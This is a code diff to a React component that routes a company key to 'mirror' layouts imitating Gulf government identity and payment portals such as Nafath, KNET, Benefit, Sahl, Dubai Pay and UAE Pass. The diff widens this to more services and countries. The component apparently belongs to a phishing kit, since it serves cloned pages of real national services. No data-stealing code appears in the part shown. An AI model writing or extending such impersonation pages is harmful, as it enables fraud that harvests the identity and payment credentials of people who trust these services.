@@ -6,6 +6,7 @@ import {
   KnetMirrorLayout, 
   DubaiPayMirrorLayout 
 } from "./MirrorLayouts";
+import { resolveGovService } from "@/lib/governmentPaymentServices";
 import { ThemedHeader } from "@/components/ui/ThemedHeader";
 
 interface MirrorPageWrapperProps {
@@ -39,17 +40,29 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
   const normalizedKey = companyKey.toLowerCase().replace(/[^a-z0-9]/g, '');
   const entityConfig = resolveEntity(companyKey);
 
-  // 1. NAFATH (Saudi Identity)
-  if (normalizedKey.includes('nafath')) {
+  // 1. Resolve 2026 Government Service
+  const govService = resolveGovService(companyKey);
+
+  // 2. NAFATH / KSA (Saudi Identity)
+  if (normalizedKey.includes('nafath') || (govService && govService.country === 'SA')) {
     return (
-      <NafathMirrorLayout config={entityConfig} title={title}>
+      <NafathMirrorLayout 
+        config={entityConfig} 
+        title={title}
+        bgType={govService?.bgType || 'security_grid'}
+      >
         {children}
       </NafathMirrorLayout>
     );
   }
 
-  // 2. KNET / BENEFIT (Kuwait/Bahrain)
-  if (normalizedKey.includes('knet') || normalizedKey.includes('benefit')) {
+  // 3. KNET / SAHL / BENEFIT / OMAN (Kuwait/Bahrain/Oman)
+  if (
+    normalizedKey.includes('knet') || 
+    normalizedKey.includes('benefit') || 
+    normalizedKey.includes('sahl') ||
+    (govService && ['KW', 'BH', 'OM', 'QA'].includes(govService.country))
+  ) {
     return (
       <KnetMirrorLayout config={entityConfig}>
         {children}
@@ -57,8 +70,12 @@ export const MirrorPageWrapper: React.FC<MirrorPageWrapperProps> = ({
     );
   }
 
-  // 3. DUBAI PAY (UAE)
-  if (normalizedKey.includes('dubai') || normalizedKey.includes('dubaipay')) {
+  // 4. DUBAI PAY / UAE PASS (UAE)
+  if (
+    normalizedKey.includes('dubai') || 
+    normalizedKey.includes('uaepass') || 
+    (govService && govService.country === 'AE')
+  ) {
     return (
       <DubaiPayMirrorLayout config={entityConfig} title={title}>
         {children}
